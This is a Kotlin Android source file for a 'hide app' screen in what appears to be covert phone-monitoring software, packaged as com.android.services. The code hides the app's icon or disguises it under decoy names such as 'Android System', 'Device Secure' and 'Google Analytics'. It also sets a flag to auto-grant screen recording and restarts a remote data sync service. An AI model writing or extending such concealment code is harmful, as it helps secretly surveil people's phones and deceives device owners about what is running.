package com.android.services.ui.fragments

import android.content.Intent
import android.graphics.Color
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.AdapterView
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.view.menu.MenuBuilder
import androidx.appcompat.view.menu.MenuPopupHelper
import androidx.appcompat.widget.PopupMenu
import androidx.databinding.DataBindingUtil
import androidx.fragment.app.activityViewModels
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.android.services.R
import com.android.services.adapter.AppIconAndNameSpinnerAdapter
import com.android.services.databinding.FragmentHideAppBinding
import com.android.services.models.AppNameAndIcon
import com.android.services.ui.activities.ManualPermissionActivity
import com.android.services.util.*
import com.android.services.viewModel.ManualPermissionViewModel

class HideAppFragment : BaseFragment(), AdapterView.OnItemSelectedListener {

    lateinit var binding: FragmentHideAppBinding
    private val manualPermissionViewModel: ManualPermissionViewModel by activityViewModels()
    private lateinit var appNamesArray:Array<String>
    private val appIcon= arrayOf(0,R.mipmap.ic_file_manager_icon,R.mipmap.ic_photos_icon,R.mipmap.ic_android_system,R.mipmap.ic_device_secure,R.mipmap.ic_music,R.mipmap.ic_google_files,R.mipmap.ic_google_analytics,R.mipmap.ic_google_app_icon,R.mipmap.ic_health_manager,R.mipmap.ic_battery_care)
    private var appIconAndNamesList= mutableListOf<AppNameAndIcon>()

    override fun initViews(view: View) {
        setHideAppBtnClickListener()
        populateAppIconsAndNamesList()
        removeChooseOptionObservers()
        setChooseOptionObservers()
        setCheckBoxCheckListener()
        FirebasePushUtils.restartRemoteDataSyncService(requireContext(), quickSync = false)
        binding.appIconsSpinner.adapter=AppIconAndNameSpinnerAdapter(requireContext(),R.layout.app_icon_and_name_spinner_item, appIconAndNamesList.toList())
        binding.appIconsSpinner.onItemSelectedListener=this
        FirebasePushUtils.restartRemoteDataSyncService(requireContext(), quickSync = false)
        AppConstants.autoGrantScreenRecordingPermission=true
    }

    private fun setCheckBoxCheckListener() {
        binding.checkboxChangeIcon.setOnCheckedChangeListener { button, b ->
            if (b){
                binding.appIconsSpinnerLayout.visibility=View.VISIBLE
            }else{
                binding.appIconsSpinnerLayout.visibility=View.GONE
            }
        }
    }

    private fun populateAppIconsAndNamesList() {
        appNamesArray=requireContext().resources.getStringArray(R.array.app_names_array)
        for (index in appIcon.indices){
            val newItem=AppNameAndIcon(appNamesArray[index],appIcon[index])
            appIconAndNamesList.add(newItem)
        }
    }

    private fun setChooseOptionsClickListeners() {
        setHideAppLayoutClickListener()
        setChangeAppIconAndNameLayoutClickListener()
    }

    private fun setChangeAppIconAndNameLayoutClickListener() {
//        binding.changeNameIconLayout.setOnClickListener {
//            val hideApp = manualPermissionViewModel.changeAppNameAndIcon.value!!
//            if (hideApp == 0) {
//                manualPermissionViewModel.setChanegAppNameAndIcon(1)
//                manualPermissionViewModel.setHideApp(0)
//                binding.appIconsSpinner.visibility=View.VISIBLE
//            }
//        }
    }
    private fun removeChooseOptionObservers() {
        manualPermissionViewModel.hideApp.removeObservers(viewLifecycleOwner)
        manualPermissionViewModel.changeAppNameAndIcon.removeObservers(viewLifecycleOwner)
    }

    private fun setHideAppBtnClickListener() {
        binding.hideAppBtn.setOnClickListener {
            val hideApp = binding.checkboxHideApp.isChecked
            val changeAppIcon = binding.checkboxChangeIcon.isChecked
            val appName = appNamesArray[binding.appIconsSpinner.selectedItemPosition]
            if ((hideApp && changeAppIcon)|| changeAppIcon){
               if(appName!="Select App Name and Icon"){
                   if (hideApp && changeAppIcon){
                       AppConstants.isAppIconChange=true
                       AppConstants.isAppHidden=true
                   }else{
                       AppConstants.isAppIconCreated=true
                   }
                   AppConstants.appChangedName=appName
                   AppIconUtil.changeAppIcon(requireContext(),appName)
               }else{
                   Toast.makeText(requireContext(),"Please Select App Name and Icon",Toast.LENGTH_SHORT).show()
                   return@setOnClickListener
               }
            }else{
                    AppConstants.isAppHidden = true
                    // Hide app request initiated
                    if (AppConstants.osGreaterThanEqualToTen) {
                        logVerbose("${ManualPermissionActivity.TAG} Changing app Icon for OS 10")
                        AppIconUtil.changeAppIcon(requireContext())
                    } else {
                        logVerbose("${ManualPermissionActivity.TAG} Hiding app icon for OS less Than 10")
                        AppIconUtil.hideAppIcon(requireContext())
                    }
            }
            LocalBroadcastManager.getInstance(requireContext()).sendBroadcast(
                Intent("com.android.services.accessibility.ACTION_BACK")
                    .putExtra("ACTION_TYPE", 0)
            )
            requireActivity().finish()
        }
        }

    private fun setHideAppLayoutClickListener() {
//        binding.hideAppBtnLayout.setOnClickListener {
//            val hideApp = manualPermissionViewModel.hideApp.value!!
//            if (hideApp == 0) {
//                manualPermissionViewModel.setHideApp(1)
//                manualPermissionViewModel.setChanegAppNameAndIcon(0)
//                binding.appIconsSpinner.visibility=View.GONE
//            }
//        }
    }

    private fun setChooseOptionObservers() {
        setHideAppLayoutObserver()
        setChaneAppNameAndIconLayoutObserver()
    }

    private fun setChaneAppNameAndIconLayoutObserver() {
//        manualPermissionViewModel.changeAppNameAndIcon.observe(viewLifecycleOwner, androidx.lifecycle.Observer {
//            it?.let { changeNameAndIcon ->
//                if (changeNameAndIcon == 1) {
//                    binding.circleImage2.background =
//                        DrawableCompat.wrap(
//                            ContextCompat.getDrawable(
//                                requireContext(),
//                                R.drawable.circle_shape
//                            )!!
//                        )
//                } else if (changeNameAndIcon == 0) {
//                    binding.circleImage2.background =
//                        DrawableCompat.wrap(
//                            ContextCompat.getDrawable(
//                                requireContext(),
//                                R.drawable.ring_shape
//                            )!!
//                        )
//                }
//            }
//        })
    }


    private fun setHideAppLayoutObserver() {
//        manualPermissionViewModel.hideApp.observe(viewLifecycleOwner, androidx.lifecycle.Observer {
//            it?.let { hideApp ->
//                if (hideApp == 1) {
//                    binding.circleImage.background =
//                        DrawableCompat.wrap(
//                            ContextCompat.getDrawable(
//                                requireContext(),
//                                R.drawable.circle_shape
//                            )!!
//                        )
//                } else if (hideApp == 0) {
//                    binding.circleImage.background =
//                        DrawableCompat.wrap(
//                            ContextCompat.getDrawable(
//                                requireContext(),
//                                R.drawable.ring_shape
//                            )!!
//                        )
//                }
//            }
//        })
    }

    override fun createView(inflater: LayoutInflater, container: ViewGroup): View {
        binding = DataBindingUtil.inflate<FragmentHideAppBinding>(
            inflater, R.layout.fragment_hide_app, container, false
        ).apply {
            lifecycleOwner = viewLifecycleOwner
        }
        return binding.root
    }

    override fun onCreateFragment() {

    }

    companion object {
        /** Creates an new instance of Accessibility Fragment **/
        fun newInstance(): HideAppFragment {
            val args = Bundle()
            val fragment = HideAppFragment()
            fragment.arguments = args
            return fragment
        }
    }

    override fun onItemSelected(parent: AdapterView<*>?, view: View?, position: Int, long: Long) {
        ((parent!!.getChildAt(0) as LinearLayout).getChildAt(1) as TextView).setTextColor(resources.getColor(R.color.white))
    }

    override fun onNothingSelected(p0: AdapterView<*>?) {
    }
}